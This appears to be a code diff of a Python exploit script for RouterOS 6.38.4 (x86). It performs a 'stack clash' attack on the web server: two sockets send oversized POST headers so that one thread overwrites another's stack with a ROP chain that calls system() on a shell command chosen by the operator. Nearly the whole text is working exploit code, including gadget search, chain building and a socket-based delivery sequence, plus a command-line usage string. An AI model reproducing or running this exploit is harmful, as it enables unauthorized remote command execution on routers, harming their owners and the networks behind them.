@@ -4,7 +4,6 @@
 
 # tested on RouterOS 6.38.4 (x86)
 
-# AST_STACKSIZE = 0x20000 (stack frame size per thread)
 # ASLR enabled on libs only
 # DEP enabled
 
@@ -12,7 +11,14 @@ import socket, time, sys, struct
 from pwn import *
 import ropgadget
 
-context(arch="i386", os="linux")
+AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
+SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
+ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!
+
+ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
+ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
+
+context(arch="i386", os="linux", log_level="WARNING")
 
 gadgets = dict()
 plt = dict()
@@ -43,36 +49,31 @@ def socketSend(s, data):
     print("Sent")
     time.sleep(0.5)
 
-def callRop(fun, args):
-    payload = struct.pack('<L', fun)
+def ropCall(function_address, *arguments):
 
-    num = len(args)
+    payload = struct.pack('<L', function_address)
 
-    if num == 0:
-        ret_gadget = gadgets['r']
-    elif num == 1:
-        ret_gadget = gadgets['p']
-    elif num == 2:
-        ret_gadget = gadgets['pp']
-    elif num == 3:
-        ret_gadget = gadgets['ppp']
-    elif num == 4:
-        ret_gadget = gadgets['pppp']
-    elif num == 5:
-        raise
+    num_arg = len(arguments)
 
-    payload += struct.pack('<L', ret_gadget)
+    if num_arg > 0:
 
-    for arg in args:
-        payload += struct.pack('<L', arg)
+        if num_arg == 1:
+            ret_gadget = gadgets['p']
+        elif num_arg == 2:
+            ret_gadget = gadgets['pp']
+        elif num_arg == 3:
+            ret_gadget = gadgets['ppp']
+        elif num_arg == 4:
+            ret_gadget = gadgets['pppp']
+        else:
+            raise
+
+        payload += struct.pack('<L', ret_gadget)
+
+        for arg in arguments:
+            payload += struct.pack('<L', arg)
 
     return payload
-
-def strncpyRop(dst, src, length):
-    return callRop(plt["strncpy"] , [dst, src, length])
-
-def dlsymRop(handle, symbol):
-    return callRop(plt["dlsym"], [handle, symbol])
 
 # pwntools filters out JOP gadgets
 # https://github.com/Gallopsled/pwntools/blob/5d537a6189be5131e63144e20556302606c5895e/pwnlib/rop/rop.py#L1074
@@ -99,45 +100,31 @@ def loadOffsets(binary, shellCmd):
 
     # www PLT symbols
     plt["strncpy"] = elf.plt['strncpy']
-    plt["dlsym"] = elf.plt['dlsym']
+    plt["dlsym"]   = elf.plt['dlsym']
 
-    # Gadgets
+    # Gadgets to clean the stack from arguments
     gadgets['pppp'] = rop.search(regs=["ebx", "esi", "edi", "ebp"]).address
     gadgets['ppp'] = rop.search(regs=["ebx", "ebp"], move=(4*4)).address
     gadgets['pp'] = rop.search(regs=["ebx", "ebp"]).address
     gadgets['p'] = rop.search(regs=["ebp"]).address
-    gadgets['r'] = rop.search().address
 
+    # Gadget to jump on the result of dlsym (address of system)
     gadgets['jeax'] = ropSearchJmp(elf, "jmp eax")
 
     system_chunks.extend(searchStringChunks(elf, "system\x00"))
     cmd_chunks.extend(searchStringChunks(elf, shellCmd + "\x00"))
 
-    # random rw "unused" place to store strings
-    ctors = elf.get_section_by_name(".ctors").header.sh_addr
+    # get the address of the first writable segment to store strings
+    writable_address = elf.writable_segments[0].header.p_paddr
 
-    strings['system'] = ctors
-    strings['cmd'] = ctors + 0xf
-
-def createPayload(binary):
-    # ROP chain
-    exploit = generateStrncpyChain(strings['system'], system_chunks)
-    exploit += generateStrncpyChain(strings['cmd'], cmd_chunks)
-    exploit += dlsymRop(0, strings['system']) # eax = libc.system
-    exploit += struct.pack('<L', gadgets['jeax'])
-    exploit += struct.pack('<L', gadgets['p'])
-    exploit += struct.pack('<L', strings['cmd'])
-
-    # Random address because the server is automatically restarted after a crash
-    exploit += struct.pack('<L', 0x13371337)
-
-    return exploit
+    strings['system'] = writable_address
+    strings['cmd']    = writable_address + 0xf
 
 def generateStrncpyChain(dst, chunks):
     chain = ""
     offset = 0
     for (address, length) in chunks:
-        chain += strncpyRop(dst + offset, address, length)
+        chain += ropCall(plt["strncpy"], dst + offset, address, length)
         offset += length
 
     return chain
@@ -158,8 +145,8 @@ def searchStringChunks(elf, string):
             chunks.append((results[0], len(looking)))
             string = string[len(looking):]
             looking = string
-        else:
-            looking = looking[:-1]
+        else:   # search failed
+            looking = looking[:-1] # search again removing last char
 
     check_length = 0
     for (address, length) in chunks:
@@ -170,34 +157,64 @@ def searchStringChunks(elf, string):
     else:
         raise
 
-
-def stackClash(ip, binary, shellCmd):
+def buildROP(binary, shellCmd):
     loadOffsets(binary, shellCmd)
+
+    # ROP chain
+    exploit  = generateStrncpyChain(strings['system'], system_chunks) # w_segment = "system"
+    exploit += generateStrncpyChain(strings['cmd'], cmd_chunks)       # w_segment = "bash cmd"
+    exploit += ropCall(plt["dlsym"], 0, strings['system']) # dlsym(0, "system"), eax = libc.system
+    exploit += ropCall(gadgets['jeax'], strings['cmd'])    # system("cmd")
+
+    # The server is automatically restarted after 3 secs, so we make it crash with a random address
+    exploit += struct.pack('<L', 0x13371337)
+
+    return exploit
+
+def stackClash(ip, port, ropChain):
+
+    print("Opening 2 sockets")
 
     # 1) Start 2 threads
     # open 2 socket so 2 threads are created
-    s1 = makeSocket(ip, 80) # socket 1, thread A
-    s2 = makeSocket(ip, 80) # socket 2, thread B
+    s1 = makeSocket(ip, port) # socket 1, thread A
+    s2 = makeSocket(ip, port) # socket 2, thread B
+
+    print("Stack clash...")
 
     # 2) Stack Clash
-    # 2.1) send post header with Content-Length 0x20900 to socket 1 (thread A)
-    socketSend(s1, makeHeader(0x29000)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
+    # 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
+    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
 
-    # 2.2) send 0x700-0x14 bytes as post data to socket 1 (thread A)
-    socketSend(s1, b'A'*(0x1000-20)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
+    # 2.2) send some bytes as post data to socket 1 (thread A)
+    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
 
-    # 2.3) send post header with Content-Length 0x200 to socket 2 (thread B)
-    socketSend(s2, makeHeader(0x8000)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
+    # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
+    socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
 
-    # 3) Create and send ROP chain
-    exploit = createPayload(binary)
-    socketSend(s1, exploit)
+    print("Sending payload")
+
+    # 3) Send ROP chain
+    socketSend(s1, ropChain) # thread A writes the ROP chain in the stack of thread B 
+
+    print("Starting exploit")
 
     # 4) Start ROP chain
     s2.close() # close socket 2 to return from the function of thread B and start ROP chain
 
+    print("Done!")
+
 if __name__ == "__main__":
-    if len(sys.argv) == 4:
-        stackClash(sys.argv[1], sys.argv[2], sys.argv[3])
+    if len(sys.argv) == 5:
+        ip       = sys.argv[1]
+        port     = int(sys.argv[2])
+        binary   = sys.argv[3]
+        shellCmd = sys.argv[4]
+
+        print("Building ROP chain...")
+        ropChain = buildROP(binary, shellCmd)
+        print("The ROP chain is " + str(len(ropChain)) + " bytes long (" + str(ROP_SPACE) + " bytes available)")
+
+        stackClash(ip, port, ropChain)
     else:
-        print("Usage: ./StackClashROPsystem.py IP binary shellcommand")
+        print("Usage: ./StackClashROPsystem.py IP PORT binary shellcommand")
